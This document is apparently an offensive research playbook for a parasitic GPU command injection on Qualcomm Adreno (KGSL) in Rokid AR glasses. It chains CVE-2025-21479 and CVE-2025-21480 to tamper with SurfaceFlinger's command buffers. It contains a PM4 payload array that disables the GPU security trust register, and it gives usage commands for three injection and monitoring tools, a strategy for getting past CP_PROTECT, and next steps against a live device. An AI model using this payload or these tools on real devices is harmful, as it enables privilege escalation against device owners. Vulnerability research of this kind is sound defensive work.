# CVE-2025-21479 + CVE-2025-21480 Parasitic GPU Command Injection

> 中文版：[PARASITIC_INJECT_ATTACK.md](PARASITIC_INJECT_ATTACK.md)

> 📌 **Basis of fact**: wherever this document touches facts such as device generation, kernel config, CVE status, GhostLock offsets, or product structure, [`reports/FACTS.md`](FACTS.md) is authoritative (single authoritative fact table; in case of conflict, that table decides).


## Attack overview

### Background problem

Creating a GPU Context directly is blocked by the driver (`legacy context switch error`), so an unprivileged process cannot submit GPU commands directly.

### Solution: parasitic injection

Use SurfaceFlinger's legitimate GPU Context and tamper with its command buffer through Cross-FD GPU Memory Access (CVE-2025-21479).

## Attack flow

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Parasitic GPU command injection flow             │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│   ┌──────────────┐      ┌──────────────┐      ┌──────────────┐     │
│   │  Shell proc  │      │ SurfaceFlinger│     │     GPU      │     │
│   │  (attacker)  │      │ (privileged)  │     │  (Adreno)    │     │
│   └──────┬───────┘      └──────┬───────┘      └──────┬───────┘     │
│          │                      │                      │            │
│          │  1. Cross-FD mmap    │                      │            │
│          │ ──────────────────>  │                      │            │
│          │  (read GPU memory)   │                      │            │
│          │                      │                      │            │
│          │  2. Identify IB loc   │                      │            │
│          │ <──────────────────  │                      │            │
│          │  (scan PM4 packets)  │                      │            │
│          │                      │                      │            │
│          │  3. Inject malicious  │                      │            │
│          │     instructions     │                      │            │
│          │ ──────────────────>  │                      │            │
│          │  (write NOP region)  │                      │            │
│          │                      │                      │            │
│          │                      │  4. Submit commands  │            │
│          │                      │ ──────────────────>  │            │
│          │                      │  (incl. tampered IB) │            │
│          │                      │                      │            │
│          │                      │  5. Execute priv insn │            │
│          │                      │ <──────────────────  │            │
│          │                      │  (CP_REG_WRITE etc.) │            │
│          │                      │                      │            │
└─────────────────────────────────────────────────────────────────────┘
```

## PM4 packet format

### Type 3 packet (standard command)

```
31  30 29      16 15    8 7       0
├───┴───┼────────┼────────┼────────┤
│ 1  1  │ COUNT  │ OPCODE │  0x00  │
└───────┴────────┴────────┴────────┘
```

### Key Opcodes

| Opcode | Name               | Purpose            |
| ------ | ------------------ | --------------- |
| 0x10   | CP_NOP             | No operation (injection point) |
| 0x3C   | CP_REG_WRITE       | Write a GPU register |
| 0x3D   | CP_MEM_WRITE       | Write to memory      |
| 0x3F   | CP_INDIRECT_BUFFER | Execute a sub-buffer    |
| 0x26   | CP_WAIT_FOR_IDLE   | Wait for the GPU to go idle   |

## Target security registers

### RBBM_SECVID_TRUST_CNTL (0x0F400)

Controls the trust level of the GPU security state.

**Attack goal**: set the value to 0x00000000, attempting to downgrade the GPU to non-secure mode.

```c
// injected PM4 command
uint32_t payload[] = {
    0xC0010026,  // CP_WAIT_FOR_IDLE, count=1
    0x00000000,  // padding
    0xC002003C,  // CP_REG_WRITE, count=2
    0x0000F400,  // RBBM_SECVID_TRUST_CNTL
    0x00000000,  // value = 0 (disable trust)
};
```

### CP_PROTECT_CNTL (0x0084C)

Controls the command processor's protection mechanism.

**Attack goal**: disable CP register protection, allowing writes to arbitrary GPU registers.

## Tool usage

### 1. Reconnaissance phase: GPU command buffer monitoring

```bash
# Monitor changes on all GPU pages (30 seconds)
./gpu_cmdbuf_spy monitor 30

# Watch real-time changes at a specific offset
./gpu_cmdbuf_spy watch 0x2000
```

**Example output**:

```
╔═══════════════════════════════════════════════════════════════╗
║  ACTIVE GPU COMMAND BUFFERS                                   ║
╠═══════════════════════════════════════════════════════════════╣
║ 0x00002000 | Changes: 1234 | PM4: YES | IB: YES | Age: 0s    ║
║ 0x00005000 | Changes:  567 | PM4: YES | IB: NO  | Age: 1s    ║
║ 0x00008000 | Changes:  890 | PM4: YES | IB: YES | Age: 0s    ║
╚═══════════════════════════════════════════════════════════════╝
```

### 2. Injection phase: SurfaceFlinger IB hijack

```bash
# List the available attack payloads
./surfaceflinger_ib_hijack list

# Single injection attempt (payload 0 = SECVID_TRUST_DISABLE)
./surfaceflinger_ib_hijack single 0

# Continuous monitoring and injection (30 seconds, payload 0)
./surfaceflinger_ib_hijack monitor 30 0
```

### 3. Combined attack

```bash
# Scan for PM4 packets
./kgsl_parasitic_inject --scan

# Single injection attempt
./kgsl_parasitic_inject --inject

# Real-time monitoring and injection
./kgsl_parasitic_inject --monitor 60
```

## Expected results

### Success indicators

1. **Payload write succeeds**: the malicious PM4 command is successfully written into the NOP region
2. **GPU executes the command**: SurfaceFlinger submits the tampered IB to the GPU
3. **Security state changes**: the GPU security register is modified

### How to check

```bash
# Check for GPU errors in dmesg
dmesg | grep -i "kgsl\|adreno\|gpu"

# Check whether the GPU is still running
cat /sys/class/kgsl/kgsl-3d0/gpuclk
cat /sys/class/kgsl/kgsl-3d0/gpu_busy_percentage
```

## Potential defenses and bypasses

### Possible defenses encountered

1. **PM4 command validation**: the GPU may validate certain sensitive commands
2. **Register write protection**: CP_PROTECT may block writes to security registers
3. **SMMU isolation**: the page table may block illegal memory access

### Bypass strategies

1. **Gradual attack**: first try writing a non-protected register to confirm the path
2. **Timing attack**: inject precisely before SurfaceFlinger submits its command
3. **Multi-stage attack**:
   - Stage one: disable CP_PROTECT
   - Stage two: write the security register

## Next actions

1. **Connect the device**: the Rokid device is currently offline and needs to be reconnected
2. **Compile the tools**: upload the source and compile it on the device
3. **Reconnaissance**: run gpu_cmdbuf_spy to identify active command buffers
4. **Injection test**: use surfaceflinger_ib_hijack to attempt injection
5. **Verify the effect**: check the GPU state and dmesg output

## Appendix: device status

- **Device**: Rokid AR Glasses (<DEVICE_SERIAL>)
- **Status**: offline (possibly in Recovery mode)
- **Needed**: the user must manually select the Recovery option to reboot the device
